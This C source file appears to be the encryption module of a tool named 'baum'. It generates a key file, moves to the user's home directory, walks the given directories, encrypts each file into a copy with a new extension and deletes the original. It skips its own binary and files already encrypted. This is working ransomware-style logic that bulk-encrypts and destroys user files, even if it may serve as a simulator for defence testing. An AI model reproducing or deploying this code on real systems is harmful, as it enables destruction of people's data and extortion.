#include "encrypt.h"

#include <string.h>
#include <unistd.h>
#include <linux/limits.h>

#include "baumcommon.h"
#include "baumhelper.h"
#include "baumcrypt.h"

int baum_createkey(const char *keyfile) {

	if (!baumcommon_force && helper_fileexists(keyfile)) {
		be("Key file '%s' already exists, "
			"use --force to overwrite\n", keyfile);
		return 1;
	}

	bp("Creating key and writing to '%s'", keyfile);

	unsigned char key[BAUMCRYPT_KEYLEN];
	int hret = baumcrypt_makekey(key);
	if (hret != 0) {
		return 1;
	}

	hret = helper_putfile(keyfile, BAUMCRYPT_KEYLEN, key);
	if (hret != 0) {
		return 1;
	}

	return 0;
}

typedef struct {
	unsigned char *key;
	const char *extension;
} tmp_helper;

static int encrypt_file(const char* name, void *arg) {
	int hret = 0;

	unsigned char *key = ((tmp_helper*)arg)->key;
	const char *extension = ((tmp_helper*)arg)->extension;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(extension);

	const char *my_basename = helper_get_own_basename();
	if (!my_basename) {
		bp("cannot get own basename");
		return 1;
	}

	size_t base_strlen = strlen(my_basename);

	if (name_strlen >= base_strlen) {
		const char *file_end = name + (name_strlen - base_strlen);
		if (memcmp(file_end, my_basename, base_strlen) == 0) {
			bp("not encrypting own binary");
			return 1;
		}
	}

	if (name_strlen + ext_strlen >= PATH_MAX) {
		bp("name would be longer than PATH_MAX");
		return 1;
	}

	if (name_strlen >= ext_strlen) {
		const char *file_ext = name + (name_strlen - ext_strlen);
		if (memcmp(file_ext, extension, ext_strlen) == 0) {
			bp("already encrypted");
			return 1;
		}
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, name_strlen);
	memcpy(name_new + name_strlen, extension, ext_strlen + 1);

	if (!baumcommon_force && helper_fileexists(name_new)) {
		bp("not encrypting: '%s' already exists", name_new);
		return 1;
	}

	bp("encrypting: '%s' into '%s'", name, name_new);

	hret = baumcrypt_encrypt(name, name_new, key);
	if (hret != 0) {
		bp("encryption failed");
		return 1;
	}

	if (!baumcommon_test) {
		hret = unlink(name);
		if (hret != 0) {
			bp("unlink failed");
		} else {
			bp("deleted '%s'", name);
		}
	}

	return 0;
}

static int decrypt_file(const char* name, void *arg) {
	int hret = 0;

	unsigned char *key = ((tmp_helper*)arg)->key;
	const char *extension = ((tmp_helper*)arg)->extension;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(extension);

	if (name_strlen >= PATH_MAX) {
		bp("name longer than PATH_MAX");
		return 1;
	}

	if (name_strlen < ext_strlen) {
		return 1;
	}

	size_t orig_len = (name_strlen - ext_strlen);
	const char *file_ext = name + orig_len;
	if (memcmp(file_ext, extension, ext_strlen) != 0) {
		bp("file doesn't have the right extension");
		return 1;
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, orig_len);
	name_new[orig_len] = '\0';

	if (!baumcommon_force && helper_fileexists(name_new)) {
		bp("not decrypting: '%s' already exists", name_new);
		return 1;
	}

	bp("decrypting: '%s' into '%s'", name, name_new);

	hret = baumcrypt_decrypt(name, name_new, key);
	if (hret != 0) {
		bp("decryption failed");
		return 1;
	}

	if (!baumcommon_test) {
		hret = unlink(name);
		if (hret != 0) {
			bp("unlink failed");
		} else {
			bp("deleted '%s'", name);
		}
	}

	return 0;
}

static int helper(const char *directories[], const char *extension,
	const char *keyfile, char mode_encrypt) {

	int hret = 0;

	bp("Using the keyfile '%s'", keyfile);

	unsigned char key[BAUMCRYPT_KEYLEN];
	FILE *f = fopen(keyfile, "rb");
	if (!f) {
		be("Cannot open keyfile");
		return 1;
	}
	hret = fread(key, BAUMCRYPT_KEYLEN, 1, f);
	if (hret != 1) {
		be("Cannot read keyfile");
		fclose(f);
		return 1;
	}
	fclose(f);

	hret = helper_chdir_home();
	if (hret != 0) {
		return 1;
	}

	for (int i = 0 ; directories[i] != NULL ; i++) {
		tmp_helper arg = {key, extension};
		hret = helper_list(directories[i],
			(mode_encrypt ? encrypt_file : decrypt_file),
			&arg);
		if (hret != 0) { }
	}

	return 0;
}

int baum_encrypt(const char *directories[], const char *extension,
	const char *keyfile) {

	bp("Encrypting");
	return helper(directories, extension, keyfile, 1);
}

int baum_decrypt(const char *directories[], const char *extension,
	const char *keyfile) {

	bp("Decrypting");
	return helper(directories, extension, keyfile, 0);
}

